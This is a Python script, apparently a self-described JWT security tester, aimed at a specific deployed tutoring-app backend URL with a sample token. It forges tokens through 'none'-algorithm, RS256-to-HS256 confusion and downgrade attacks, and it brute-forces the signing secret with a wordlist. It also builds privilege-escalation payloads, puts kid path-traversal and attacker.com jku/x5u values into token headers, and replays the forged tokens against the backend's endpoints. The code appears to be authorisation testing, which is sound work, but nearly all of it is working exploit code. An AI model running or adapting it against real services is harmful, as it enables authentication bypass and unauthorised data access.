import jwt
import requests
import json
import base64
import hashlib
import itertools
import time
from typing import Dict, List, Any, Optional

class AdvancedJWTTester:
    """Advanced JWT security testing with algorithm confusion and brute force"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.vulnerabilities = []
        
    def decode_jwt_without_verification(self, token: str) -> Dict[str, Any]:
        """Decode JWT without signature verification"""
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            return {
                "header": header,
                "payload": payload,
                "valid_format": True
            }
        except Exception as e:
            return {
                "header": None,
                "payload": None,
                "valid_format": False,
                "error": str(e)
            }
    
    def test_algorithm_confusion(self, original_token: str) -> List[str]:
        """Test JWT algorithm confusion attacks"""
        print("\n🔄 Testing JWT Algorithm Confusion Attacks...")
        
        decoded = self.decode_jwt_without_verification(original_token)
        if not decoded['valid_format']:
            print("❌ Invalid JWT format")
            return []
        
        header = decoded['header']
        payload = decoded['payload']
        malicious_tokens = []
        
        # Test 1: Algorithm None Attack
        print("Testing 'none' algorithm attack...")
        try:
            none_header = header.copy()
            none_header['alg'] = 'none'
            
            # Create token with no signature
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(none_header).encode()
            ).decode().rstrip('=')
            
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            none_token = f"{encoded_header}.{encoded_payload}."
            malicious_tokens.append(("none_algorithm", none_token))
            print(f"✓ Generated 'none' algorithm token")
            
        except Exception as e:
            print(f"❌ Failed to create 'none' token: {e}")
        
        # Test 2: RS256 to HS256 Confusion
        if header.get('alg') == 'RS256':
            print("Testing RS256 to HS256 algorithm confusion...")
            try:
                hs256_header = header.copy()
                hs256_header['alg'] = 'HS256'
                
                # Common public keys to try as HMAC secrets
                common_public_keys = [
                    "-----BEGIN PUBLIC KEY-----",
                    "public_key",
                    "rsa_public_key", 
                    "jwt_public_key"
                ]
                
                for pub_key in common_public_keys:
                    try:
                        hs256_token = jwt.encode(
                            payload, 
                            pub_key, 
                            algorithm='HS256',
                            headers=hs256_header
                        )
                        malicious_tokens.append(("rs256_to_hs256", hs256_token))
                        print(f"✓ Generated HS256 token with public key as secret")
                        break
                    except:
                        continue
                        
            except Exception as e:
                print(f"❌ Failed RS256 to HS256 attack: {e}")
        
        # Test 3: Weak Algorithm Downgrade
        weak_algorithms = ['HS1', 'HS224', 'HS384', 'none', 'NONE', 'None']
        for weak_alg in weak_algorithms:
            try:
                weak_header = header.copy()
                weak_header['alg'] = weak_alg
                
                if weak_alg.lower() == 'none':
                    # No signature needed
                    encoded_header = base64.urlsafe_b64encode(
                        json.dumps(weak_header).encode()
                    ).decode().rstrip('=')
                    encoded_payload = base64.urlsafe_b64encode(
                        json.dumps(payload).encode()
                    ).decode().rstrip('=')
                    weak_token = f"{encoded_header}.{encoded_payload}."
                else:
                    # Try with weak secret
                    weak_token = jwt.encode(payload, "weak", algorithm=weak_alg.replace('1', '1').replace('224', '224').replace('384', '384'))
                
                malicious_tokens.append((f"weak_algorithm_{weak_alg}", weak_token))
                print(f"✓ Generated {weak_alg} token")
                
            except Exception as e:
                continue
        
        return malicious_tokens
    
    def test_jwt_brute_force(self, original_token: str) -> List[str]:
        """Brute force JWT secret with common passwords"""
        print("\n🔨 Testing JWT Secret Brute Force...")
        
        decoded = self.decode_jwt_without_verification(original_token)
        if not decoded['valid_format']:
            print("❌ Invalid JWT format")
            return []
        
        header = decoded['header']
        payload = decoded['payload']
        algorithm = header.get('alg', 'HS256')
        
        # Common secrets to try
        common_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key',
            'jwt_secret', 'your_secret_key', 'secret_key', 'my_secret',
            '', ' ', 'null', 'undefined', 'jwt', 'token', 'auth',
            'your-256-bit-secret', 'your-secret-key', 'mysecretkey',
            'jwtsecret', 'secretkey', 'mykey', 'key123', 'pass123',
            'admin123', 'root', 'user', 'default', 'changeme',
            'qwerty', 'letmein', 'welcome', 'monkey', 'dragon'
        ]
        
        # Add application-specific secrets
        app_specific = [
            'brimai', 'brimai_secret', 'tutor', 'education', 'quiz',
            'brimai_jwt', 'tutor_secret', 'app_secret', 'api_key'
        ]
        common_secrets.extend(app_specific)
        
        successful_tokens = []
        
        for secret in common_secrets:
            try:
                # Try to create a token with this secret
                test_token = jwt.encode(payload, secret, algorithm=algorithm)
                
                # Verify if it matches the original (same signature)
                try:
                    jwt.decode(original_token, secret, algorithms=[algorithm])
                    print(f"🎯 SECRET FOUND: '{secret}'")
                    self.vulnerabilities.append({
                        "type": "Weak JWT Secret",
                        "severity": "CRITICAL",
                        "details": f"JWT secret is weak and brute-forceable: '{secret}'",
                        "algorithm": algorithm
                    })
                    successful_tokens.append(("brute_force_success", test_token))
                    return successful_tokens
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                    
            except Exception:
                continue
        
        print("✅ JWT secret appears to be strong (not in common wordlist)")
        return successful_tokens
    
    def test_jwt_manipulation(self, original_token: str) -> List[str]:
        """Test JWT payload and header manipulation"""
        print("\n✏️ Testing JWT Manipulation Attacks...")
        
        decoded = self.decode_jwt_without_verification(original_token)
        if not decoded['valid_format']:
            return []
        
        header = decoded['header']
        payload = decoded['payload']
        manipulated_tokens = []
        
        # Test payload manipulation
        payload_tests = [
            ("admin_escalation", {"admin": True, "role": "admin"}),
            ("user_id_manipulation", {"user_id": 1, "id": 1}),
            ("expiry_extension", {"exp": int(time.time()) + 86400 * 365}),  # 1 year
            ("scope_escalation", {"scope": "admin:*", "permissions": ["admin", "write", "delete"]}),
            ("null_user", {"user": None, "user_id": None}),
            ("negative_user_id", {"user_id": -1, "id": -1}),
            ("boolean_bypass", {"authenticated": True, "verified": True}),
        ]
        
        for test_name, modifications in payload_tests:
            try:
                modified_payload = payload.copy()
                modified_payload.update(modifications)
                
                # Try to create token without knowing the secret (will fail verification but might be accepted)
                # This tests if the application properly validates signatures
                
                # Create a token with a fake signature
                encoded_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                
                encoded_payload = base64.urlsafe_b64encode(
                    json.dumps(modified_payload).encode()
                ).decode().rstrip('=')
                
                # Use original signature (signature won't match but app might not check)
                original_parts = original_token.split('.')
                if len(original_parts) == 3:
                    fake_token = f"{encoded_header}.{encoded_payload}.{original_parts[2]}"
                    manipulated_tokens.append((test_name, fake_token))
                    print(f"✓ Generated {test_name} token")
                
            except Exception as e:
                print(f"❌ Failed {test_name}: {e}")
        
        # Test header manipulation
        header_tests = [
            ("kid_manipulation", {"kid": "../../../etc/passwd"}),
            ("jku_manipulation", {"jku": "https://attacker.com/jwks.json"}),
            ("x5u_manipulation", {"x5u": "https://attacker.com/cert.pem"}),
            ("crit_manipulation", {"crit": ["admin"], "admin": True}),
        ]
        
        for test_name, modifications in header_tests:
            try:
                modified_header = header.copy()
                modified_header.update(modifications)
                
                encoded_header = base64.urlsafe_b64encode(
                    json.dumps(modified_header).encode()
                ).decode().rstrip('=')
                
                encoded_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                
                original_parts = original_token.split('.')
                if len(original_parts) == 3:
                    fake_token = f"{encoded_header}.{encoded_payload}.{original_parts[2]}"
                    manipulated_tokens.append((test_name, fake_token))
                    print(f"✓ Generated {test_name} token")
                
            except Exception as e:
                continue
        
        return manipulated_tokens
    
    def test_tokens_against_endpoints(self, tokens: List[tuple], test_endpoints: List[str]) -> None:
        """Test generated tokens against protected endpoints"""
        print("\n🎯 Testing Manipulated Tokens Against Endpoints...")
        
        if not tokens:
            print("No tokens to test")
            return
        
        for endpoint in test_endpoints:
            print(f"\nTesting endpoint: {endpoint}")
            
            # First test without token
            try:
                response = requests.get(f"{self.target_url}{endpoint}", timeout=5)
                baseline_status = response.status_code
                print(f"  Baseline (no token): {baseline_status}")
            except:
                print(f"  Baseline: Error")
                continue
            
            # Test each manipulated token
            for token_type, token in tokens:
                try:
                    headers = {"Authorization": f"Bearer {token}"}
                    response = requests.get(f"{self.target_url}{endpoint}", headers=headers, timeout=5)
                    
                    # Check if token was accepted
                    if response.status_code == 200 and baseline_status != 200:
                        self.vulnerabilities.append({
                            "type": f"JWT {token_type.replace('_', ' ').title()} Bypass",
                            "severity": "CRITICAL",
                            "details": f"Manipulated JWT token accepted at {endpoint}",
                            "endpoint": endpoint,
                            "token_type": token_type
                        })
                        print(f"  🚨 {token_type}: ACCEPTED (200) - VULNERABLE!")
                        
                        # Try to extract response data
                        try:
                            data = response.json()
                            if data and not any(err in str(data).lower() for err in ['error', 'unauthorized', 'invalid']):
                                print(f"    → Data exposed: {str(data)[:100]}...")
                        except:
                            pass
                            
                    elif response.status_code in [401, 403]:
                        print(f"  ✅ {token_type}: Rejected ({response.status_code})")
                    else:
                        print(f"  ℹ️  {token_type}: Status {response.status_code}")
                        
                except Exception as e:
                    print(f"  ❌ {token_type}: Error - {str(e)}")
    
    def run_full_jwt_test(self, original_token: str, test_endpoints: List[str] = None) -> Dict[str, Any]:
        """Run complete JWT security test suite"""
        print("="*60)
        print("🔐 ADVANCED JWT SECURITY TESTING")
        print("="*60)
        
        if test_endpoints is None:
            test_endpoints = ["/api/user", "/api/admin", "/api/dashboard", "/api/profile"]
        
        # Analyze original token
        print("📋 Analyzing Original Token...")
        decoded = self.decode_jwt_without_verification(original_token)
        
        if decoded['valid_format']:
            print(f"Algorithm: {decoded['header'].get('alg')}")
            print(f"Token Type: {decoded['header'].get('typ')}")
            print(f"Payload: {json.dumps(decoded['payload'], indent=2)[:200]}...")
        else:
            print("❌ Invalid JWT format")
            return {"status": "Invalid JWT"}
        
        # Run all tests
        all_tokens = []
        
        # Algorithm confusion attacks
        algo_tokens = self.test_algorithm_confusion(original_token)
        all_tokens.extend(algo_tokens)
        
        # Brute force attacks
        brute_tokens = self.test_jwt_brute_force(original_token)
        all_tokens.extend(brute_tokens)
        
        # Manipulation attacks
        manip_tokens = self.test_jwt_manipulation(original_token)
        all_tokens.extend(manip_tokens)
        
        # Test tokens against endpoints
        self.test_tokens_against_endpoints(all_tokens, test_endpoints)
        
        # Generate report
        report = {
            "original_token_info": decoded,
            "total_tokens_generated": len(all_tokens),
            "vulnerabilities": self.vulnerabilities,
            "total_vulnerabilities": len(self.vulnerabilities),
            "critical_count": len([v for v in self.vulnerabilities if v["severity"] == "CRITICAL"])
        }
        
        # Print summary
        print("\n" + "="*60)
        print("📊 JWT SECURITY REPORT")
        print("="*60)
        print(f"Tokens Generated: {len(all_tokens)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"Critical Issues: {report['critical_count']}")
        
        if self.vulnerabilities:
            print("\n🚨 VULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities:
                print(f"  {vuln['severity']}: {vuln['type']}")
                print(f"    → {vuln['details']}")
        
        return report

# Usage example
if __name__ == "__main__":
    # Your JWT token (get this from browser dev tools or login response)
    jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTE0MzYxMTksIm5vbmNlIjoiNDE1NTAzZDBjOWYyZGMxYiJ9.SR0smx8oYytKi6FA2lve24LZOO1DbTTJxzzLwNu9cXc"
    
    # Your application URL
    app_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"
    
    # Initialize tester
    tester = AdvancedJWTTester(app_url)
    
    # Run tests
    results = tester.run_full_jwt_test(jwt_token)
    
    # Save results
    with open("jwt_security_report.json", "w") as f:
        json.dump(results, f, indent=2)